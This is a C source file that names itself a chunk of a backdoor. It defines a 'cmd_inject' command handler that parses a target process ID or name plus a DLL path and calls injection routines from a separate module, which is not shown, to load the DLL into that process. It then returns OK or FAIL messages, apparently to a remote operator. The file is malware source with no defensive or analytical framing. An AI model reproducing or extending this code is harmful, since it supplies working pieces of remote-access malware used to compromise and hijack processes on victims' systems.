// chunk: commands/cmd_inject
// depends: injection/dll_inject
// provides: cmd_inject
// note: Backdoor command — inject DLL into target process

#ifndef CHUNK_CMD_INJECT
#define CHUNK_CMD_INJECT

static int cmd_inject(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    if (!args || args_len < 3) {
        const char *msg = "FAIL: Usage: pid|dll_path or process_name|dll_path";
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 1;
    }

    char target[256] = {0};
    char dll_path[512] = {0};

    char *sep = strchr(args, '|');
    if (!sep) {
        const char *msg = "FAIL: Usage: pid|dll_path or process_name|dll_path";
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 1;
    }

    DWORD target_len = (DWORD)(sep - args);
    if (target_len >= sizeof(target)) target_len = sizeof(target) - 1;
    memcpy(target, args, target_len);

    strncpy(dll_path, sep + 1, sizeof(dll_path) - 1);

    int result = 0;
    DWORD pid = atoi(target);
    if (pid > 0) {
        result = inject_dll(pid, dll_path);
    } else {
        result = inject_dll_by_name(target, dll_path);
    }

    if (result) {
        char msg[512];
        snprintf(msg, sizeof(msg), "OK: Injected %s into %s", dll_path, target);
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 0;
    } else {
        char msg[256];
        snprintf(msg, sizeof(msg), "FAIL: Injection into %s failed", target);
        DWORD len = (DWORD)strlen(msg);
        memcpy(out, msg, len < *out_len ? len : *out_len);
        *out_len = len < *out_len ? len : *out_len;
        return 1;
    }
}

#endif
